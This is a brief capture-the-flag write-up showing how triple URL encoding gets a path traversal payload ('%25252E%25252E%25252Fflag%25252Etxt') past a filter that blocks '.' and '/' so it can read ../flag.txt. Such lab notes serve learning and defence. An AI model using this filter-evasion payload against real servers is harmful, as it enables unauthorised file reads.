# Requirement
- Not allow to use and '/' and '.' in the first few message
- decode 3 time

first handle decode by encode `../flag.txt` 3 time
result in `..%25252Fflag.txt`
restriction on '/' can be ignore, cause it will not appear until the final decode

After searching online '.' can be encode to '%2E'
we can encode it twice to become '%25252E'
we can replace every '.' with '%25252E'

so the final message become '%25252E%25252E%25252Fflag%25252Etxt'

